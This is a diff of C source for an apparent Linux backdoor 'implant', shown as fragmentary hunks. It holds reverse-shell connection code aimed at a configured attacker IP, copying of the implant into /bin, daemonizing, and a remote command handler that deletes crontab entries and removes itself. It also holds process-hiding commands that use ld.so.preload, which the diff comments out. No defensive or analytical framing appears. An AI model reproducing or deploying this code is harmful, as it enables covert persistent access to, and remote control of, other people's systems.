@@ -188,8 +188,9 @@ void foo()
   #endif
 
   #ifdef REVERSESHELL
+  #ifdef DEBUG
   printf("REVERSESHELL: %d!\n", REVERSESHELL);
-
+  #endif
   const char* ip = REVERSEIP;
   struct sockaddr_in addr;
   addr.sin_family = AF_INET;
@@ -286,7 +287,7 @@ int main(void) {
         //getRoot();
         /*=====================================*/
         /* Our process ID and Session ID */
-        #ifdef MUTEX
+        
         if(access( MUTEX, F_OK) != 0){
           system("cp implant /bin");
           system("rm -f implant");
@@ -295,15 +296,16 @@ int main(void) {
           printf("exiting backdoor");
           exit(1);
         }
-        #endif
         FILE *fp = NULL;
         fp = fopen("/bin/1s", "w");
-
-        //Hide this program
+        
+          //Hide this program
+        //curlDown("goodipaddress/so", "so file");
+        /*
         system("gcc -Wall -fPIC -shared -o libprocesshider.so processhider.c -ldl");
         system("sudo mv libprocesshider.so /usr/local/lib/");
         system("echo /usr/local/lib/libprocesshider.so >> /etc/ld.so.preload");
-
+        */
         //#ifndef DEBUG
         pid_t pid, sid;
 
@@ -350,8 +352,10 @@ int main(void) {
         #endif
         /* The Big Loop */
         #ifndef MULTI_KNOCK
+        foo();
+        /*
         while (1) {
-           /* Do some task here ... */
+           /* Do some task here ... 
            #ifdef BINDSHELL
            foo(); //bindshell code
            //break;
@@ -361,21 +365,21 @@ int main(void) {
            foo(); //reverseshell code
            //break;
            #endif
-           //sleep(30); /* wait 30 seconds */
-        }
+           //sleep(30); /* wait 30 seconds 
+        }*/
         #endif
 
 
   //VALIDATOR!!!!!!!!!!!!!!!!!!!
    exit(EXIT_SUCCESS);
 }
-
+/*
 static size_t write_data(void *ptr, size_t size, size_t nmemb, void *stream)
 {
   size_t written = fwrite(ptr, size, nmemb, (FILE *)stream);
   return written;
 }
-
+*/
 #ifdef COMMANDS
 void commands(int sockfd){
   #define DESTROY "\
@@ -398,10 +402,10 @@ void commands(int sockfd){
       system("crontab -r");
       remove("/bin/implant");
       remove(MUTEX);
-      free(buf);
+      //free(buf);
       //remove cron, the implant a.out, and then exit() the implant process
 
-      endConnect = 1;
+      //endConnect = 1;
     }
     else if(strstr(buf, "SLEEP") != NULL){
       sleep(SLEEP);
@@ -457,6 +461,7 @@ void commands(int sockfd){
       remove("/bin/implant");
       remove(MUTEX);
       free(buf);
+      exit(0);
     }
   }
 }
